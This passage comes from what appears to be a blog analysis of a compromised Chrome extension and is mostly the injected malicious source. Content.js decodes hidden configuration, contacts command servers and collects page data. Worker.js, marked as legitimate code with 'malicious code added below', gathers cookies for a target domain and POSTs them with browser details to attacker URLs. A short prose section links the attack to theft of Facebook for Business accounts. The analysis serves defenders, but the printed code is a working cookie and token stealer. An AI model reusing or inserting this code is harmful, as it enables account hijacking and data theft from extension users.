					<span class="nx">s</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">openapi_u</span><span class="p">));</span>
				<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
				<span class="p">}</span>
				<span class="kd">const</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">openapi_tk</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> || </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> || </span><span class="dl">'</span> <span class="o">+</span> <span class="nf">btoa</span><span class="p">(</span><span class="nb">navigator</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> || </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">uid</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> || </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">s</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> ||  || </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">k</span><span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">{</span>
						<span class="na">ms1</span><span class="p">:</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">i</span><span class="p">),</span>
						<span class="na">ms2</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenext_cx</span><span class="p">),</span>
						<span class="na">ms3</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">gpta</span><span class="p">)</span>
					<span class="p">},</span> <span class="nx">l</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
				<span class="nf">fetch</span><span class="p">(</span><span class="nx">l</span><span class="p">,</span> <span class="p">{</span>
					<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
					<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
						<span class="na">Accept</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json, application/xml, text/plain, text/html, *.*</span><span class="dl">'</span><span class="p">,</span>
						<span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span>
					<span class="p">},</span>
					<span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span>
</pre></table></code></div></div><p>Given the nature of the URLs delivered by the threat actor C2, this seems to be an opportunistic attack, possibly trying to target Facebook for Business accounts. In the last year, I have seen multiple infostealers originating from Vietnam targeting Facebook for Business accounts. The implementation of a malicious browser extension might be a response from the threat actors to the <a href="https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html">increasing cookie protections in Google Chrome</a>.</p><h1 id="full-script-content">Full script content</h1><ul><li>Content.js:</ul><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
</pre><td class="rouge-code"><pre><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nf">addListener</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">t</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Message received:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">e</span><span class="p">),</span> <span class="dl">'</span><span class="s1">getScreenSize</span><span class="dl">'</span> <span class="o">===</span> <span class="nx">e</span><span class="p">.</span><span class="nx">command</span> <span class="o">&amp;&amp;</span> <span class="nf">a</span><span class="p">({</span>
		<span class="na">screenWidth</span><span class="p">:</span> <span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">width</span><span class="p">,</span>
		<span class="na">screenHeight</span><span class="p">:</span> <span class="nb">window</span><span class="p">.</span><span class="nx">screen</span><span class="p">.</span><span class="nx">height</span>
	<span class="p">});</span>
<span class="p">}),</span> <span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
	<span class="k">try</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="p">{</span><span class="na">cyberhavenext_ext_manage</span><span class="p">:</span> <span class="nx">t</span><span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nf">get</span><span class="p">([</span><span class="dl">'</span><span class="s1">cyberhavenext_ext_manage</span><span class="dl">'</span><span class="p">]);</span>
		<span class="nx">e</span> <span class="o">=</span> <span class="nx">t</span> <span class="p">?</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">:</span> <span class="kc">null</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error retrieving data from storage:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="mi">2000</span> <span class="o">!==</span> <span class="nx">e</span><span class="p">.</span><span class="nx">code</span> <span class="p">?</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextc</span><span class="p">)))</span>
			<span class="k">try</span> <span class="p">{</span>
				<span class="k">await</span> <span class="k">async</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
					<span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextf</span><span class="p">),</span> <span class="nx">a</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextg</span><span class="p">),</span> <span class="nx">o</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextb</span><span class="p">),</span> <span class="nx">r</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenexth</span><span class="p">),</span> <span class="nx">n</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextd</span><span class="p">),</span> <span class="nx">c</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenexte</span><span class="p">),</span> <span class="nx">l</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenexta</span><span class="p">),</span> <span class="nx">s</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenexti</span><span class="p">),</span> <span class="nx">i</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextl</span><span class="p">),</span> <span class="nx">w</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextm</span><span class="p">),</span> <span class="nx">k</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextn</span><span class="p">),</span> <span class="nx">d</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenexto</span><span class="p">),</span> <span class="nx">m</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextp</span><span class="p">),</span> <span class="nx">V</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextk</span><span class="p">);</span>
					<span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextq</span><span class="p">),</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextr</span><span class="p">);</span>
					<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
						<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-rtext</span><span class="dl">'</span><span class="p">,</span>
						<span class="na">url</span><span class="p">:</span> <span class="nx">t</span>
					<span class="p">},</span> <span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
						<span class="kd">const</span> <span class="nx">i</span> <span class="o">=</span> <span class="sr">/6kU.*</span><span class="se">?</span><span class="sr">"/gm</span><span class="p">;</span>
						<span class="kd">let</span> <span class="nx">w</span><span class="p">,</span> <span class="nx">k</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
						<span class="k">for </span><span class="p">(;</span> <span class="kc">null</span> <span class="o">!==</span> <span class="p">(</span><span class="nx">w</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nf">exec</span><span class="p">(</span><span class="nx">t</span><span class="p">));)</span>
							<span class="nx">k</span> <span class="o">=</span> <span class="nx">w</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
						<span class="k">if </span><span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
							<span class="kd">let</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">s</span> <span class="o">+</span> <span class="nx">k</span><span class="p">;</span>
							<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
								<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-rjson</span><span class="dl">'</span><span class="p">,</span>
								<span class="na">url</span><span class="p">:</span> <span class="nx">r</span> <span class="o">+</span> <span class="nx">t</span>
							<span class="p">},</span> <span class="k">async</span> <span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span>
								<span class="kd">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">r</span><span class="p">;</span>
								<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
									<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-rjson</span><span class="dl">'</span><span class="p">,</span>
									<span class="na">url</span><span class="p">:</span> <span class="nx">a</span> <span class="o">+</span> <span class="nx">t</span>
								<span class="p">},</span> <span class="k">async</span> <span class="nx">a</span> <span class="o">=&gt;</span> <span class="p">{</span>
									<span class="kd">const</span> <span class="nx">r</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
									<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
										<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-rjson</span><span class="dl">'</span><span class="p">,</span>
										<span class="na">url</span><span class="p">:</span> <span class="nx">V</span> <span class="o">+</span> <span class="nx">t</span>
									<span class="p">},</span> <span class="k">async</span> <span class="nx">a</span> <span class="o">=&gt;</span> <span class="p">{</span>
										<span class="kd">const</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
										<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
											<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-check-errors</span><span class="dl">'</span><span class="p">,</span>
											<span class="na">url</span><span class="p">:</span> <span class="nx">o</span><span class="p">,</span>
											<span class="na">pl</span><span class="p">:</span> <span class="p">{</span>
												<span class="na">dm</span><span class="p">:</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextc</span><span class="p">),</span>
												<span class="na">openapi_tk</span><span class="p">:</span> <span class="nx">t</span><span class="p">,</span>
												<span class="na">openapi_u</span><span class="p">:</span> <span class="nx">i</span><span class="p">,</span>
												<span class="na">cyberhavenext_cx</span><span class="p">:</span> <span class="nx">r</span><span class="p">,</span>
												<span class="na">gpta</span><span class="p">:</span> <span class="nx">w</span><span class="p">,</span>
												<span class="na">uid</span><span class="p">:</span> <span class="nx">s</span><span class="p">,</span>
												<span class="na">hed</span><span class="p">:</span> <span class="nx">n</span><span class="p">,</span>
												<span class="na">n</span><span class="p">:</span> <span class="nx">c</span><span class="p">,</span>
												<span class="na">r</span><span class="p">:</span> <span class="nx">l</span><span class="p">,</span>
												<span class="na">k</span><span class="p">:</span> <span class="dl">''</span>
											<span class="p">}</span>
										<span class="p">},</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
											<span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nf">set</span><span class="p">({</span> <span class="na">cyberhavenext_ext_log</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">});</span>
										<span class="p">});</span>
									<span class="p">});</span>
								<span class="p">});</span>
							<span class="p">});</span>
						<span class="p">}</span>
					<span class="p">}),</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
						<span class="nb">document</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">i</span><span class="p">).</span><span class="nf">forEach</span><span class="p">(</span><span class="k">async</span> <span class="nx">e</span> <span class="o">=&gt;</span> <span class="p">{</span>
							<span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nf">getAttribute</span><span class="p">(</span><span class="nx">m</span><span class="p">);</span>
							<span class="k">if </span><span class="p">(</span><span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="nx">t</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">k</span><span class="p">))</span>
								<span class="k">try</span> <span class="p">{</span>
									<span class="kd">const</span> <span class="p">{</span><span class="na">cyberhavenext_ext_log</span><span class="p">:</span> <span class="nx">e</span><span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nf">get</span><span class="p">([</span><span class="dl">'</span><span class="s1">cyberhavenext_ext_log</span><span class="dl">'</span><span class="p">]),</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">e</span> <span class="p">?</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">:</span> <span class="dl">''</span><span class="p">;</span>
									<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
										<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-validate</span><span class="dl">'</span><span class="p">,</span>
										<span class="na">url</span><span class="p">:</span> <span class="nx">d</span><span class="p">,</span>
										<span class="na">pl</span><span class="p">:</span> <span class="p">{</span>
											<span class="na">sc</span><span class="p">:</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">t</span><span class="p">),</span>
											<span class="na">cf</span><span class="p">:</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span>
										<span class="p">}</span>
									<span class="p">});</span>
								<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
									<span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error retrieving log data:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
								<span class="p">}</span>
						<span class="p">});</span>
					<span class="p">});</span>
				<span class="p">}(</span><span class="nx">e</span><span class="p">);</span>
			<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
				<span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error processing valid URL:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="k">else</span>
			<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
				<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-redirect</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">url</span><span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextf</span>
			<span class="p">},</span> <span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="mi">0</span> <span class="o">===</span> <span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
					<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-completions</span><span class="dl">'</span><span class="p">,</span>
					<span class="na">key</span><span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextd</span>
				<span class="p">});</span>
			<span class="p">});</span>
	<span class="p">},</span> <span class="mi">2000</span><span class="p">)</span> <span class="p">:</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
		<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-redirect</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">url</span><span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextf</span>
	<span class="p">},</span> <span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="mi">0</span> <span class="o">===</span> <span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">sendMessage</span><span class="p">({</span>
			<span class="na">action</span><span class="p">:</span> <span class="dl">'</span><span class="s1">cyberhavenext-completions</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">key</span><span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">cyberhavenextd</span>
		<span class="p">});</span>
	<span class="p">});</span>
<span class="p">}();</span>
</pre></table></code></div></div><ul><li>Worker.js:</ul><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
</pre><td class="rouge-code"><pre><span class="c1">//Legitimate worker.js code:</span>
<span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="dl">'</span><span class="s1">use strict</span><span class="dl">'</span><span class="p">;</span>
	<span class="k">try</span> <span class="p">{</span>
		<span class="nf">importScripts</span><span class="p">(</span><span class="dl">'</span><span class="s1">browser-polyfill.min.js</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">background.js</span><span class="dl">'</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">})();</span>

<span class="c1">//Malicious coded added below:</span>

<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nf">addListener</span><span class="p">((</span><span class="nx">t</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="k">switch </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">action</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-completions</span><span class="dl">'</span><span class="p">:</span>
		<span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://chatgpt[.]com/status/</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
			<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
				<span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">Authorization</span><span class="p">:</span> <span class="s2">`Bearer </span><span class="p">${</span> <span class="nx">t</span><span class="p">.</span><span class="nx">key</span> <span class="p">}</span><span class="s2">`</span>
			<span class="p">},</span>
			<span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span>
				<span class="na">prompt</span><span class="p">:</span> <span class="dl">'</span><span class="s1">check</span><span class="dl">'</span><span class="p">,</span>
				<span class="na">max_tokens</span><span class="p">:</span> <span class="mi">150</span>
			<span class="p">})</span>
		<span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nx">t</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nf">a</span><span class="p">(</span><span class="nx">t</span><span class="p">)).</span><span class="k">catch</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="p">});</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-redirect</span><span class="dl">'</span><span class="p">:</span>
		<span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">url</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">redirected</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nf">a</span><span class="p">(</span><span class="nx">t</span><span class="p">)).</span><span class="k">catch</span><span class="p">();</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-validate</span><span class="dl">'</span><span class="p">:</span>
		<span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span>
			<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
				<span class="na">Accept</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json, application/xml, text/plain, text/html, *.*</span><span class="dl">'</span><span class="p">,</span>
				<span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span>
			<span class="p">},</span>
			<span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">pl</span><span class="p">)</span>
		<span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nx">t</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nf">a</span><span class="p">(</span><span class="nx">t</span><span class="p">)).</span><span class="k">catch</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="p">});</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-rtext</span><span class="dl">'</span><span class="p">:</span>
		<span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">url</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nx">t</span><span class="p">.</span><span class="nf">text</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nf">a</span><span class="p">(</span><span class="nx">t</span><span class="p">)).</span><span class="k">catch</span><span class="p">();</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-rjson</span><span class="dl">'</span><span class="p">:</span>
		<span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">url</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nx">t</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="nf">a</span><span class="p">(</span><span class="nx">t</span><span class="p">)).</span><span class="k">catch</span><span class="p">();</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="dl">'</span><span class="s1">cyberhavenext-check-errors</span><span class="dl">'</span><span class="p">:</span>
		<span class="kd">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">pl</span><span class="p">;</span>
		<span class="kd">let</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">dm</span><span class="p">;</span>
		<span class="nx">chrome</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nf">getAll</span><span class="p">({</span> <span class="na">domain</span><span class="p">:</span> <span class="nx">n</span> <span class="p">},</span> <span class="nx">n</span> <span class="o">=&gt;</span> <span class="p">{</span>
			<span class="k">if </span><span class="p">(</span><span class="nx">n</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">t</span> <span class="o">=&gt;</span> <span class="p">({</span>
						<span class="na">domain</span><span class="p">:</span> <span class="nx">t</span><span class="p">.</span><span class="nx">domain</span><span class="p">,</span>
